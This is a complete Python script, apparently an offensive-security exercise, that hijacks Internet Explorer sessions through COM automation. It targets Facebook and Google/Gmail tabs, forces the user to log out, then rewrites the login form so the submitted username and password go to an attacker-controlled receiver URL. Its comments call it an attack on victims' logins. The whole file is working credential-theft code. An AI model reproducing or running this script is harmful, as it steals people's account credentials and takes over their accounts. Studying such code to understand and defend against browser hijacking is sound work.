import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/"

target_sites  = {}
# 'logout_url' redirect via a GET request to force a user to log out.
# 'logout_form' is a DOM element that forces the logout.
# 'login_form_index' is the relative location in the target domain's DOM that contains the login form which will modify
# 'owned' tell if already captured credentials from a target site in order to stop log in repeatedly
target_sites["www.facebook.com"] = \
    {"logout_url"      : None,
     "logout_form"     : "logout_form",
     "login_form_index": 0,
     "owned"           : False}

target_sites["accounts.google.com"]    = \
    {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
     "logout_form"      : None,
     "login_form_index" : 0,
     "owned"            : False}
# use th same target for multiple Gmail domains
target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]
# This is Internet Explorer's class ID
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
# instantiate the COM object, which gives access to all tabs and instances of Internet Explorer
windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

# START the main loop of attack
while True:

    for browser in windows:

        url = urlparse.urlparse(browser.LocationUrl)

        if url.hostname in target_sites:

            if target_sites[url.hostname]["owned"]:
                continue

            # if there is an URL we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                # this makes log out target from site
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                # waits for a browser to complete an operation
                wait_for_browser(browser)
            else:
                # retrieve all elements in the document
                full_doc = browser.Document.all

                # iterate looking for the logout form
                for i in full_doc:

                    try:

                        # find the logout form and submit it
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)

                    except:
                        pass

            # now we modify the login form
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                # modify the endpoint of the form to post the username and password to a server that hacker control
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True

            except:
                pass

        time.sleep(5)
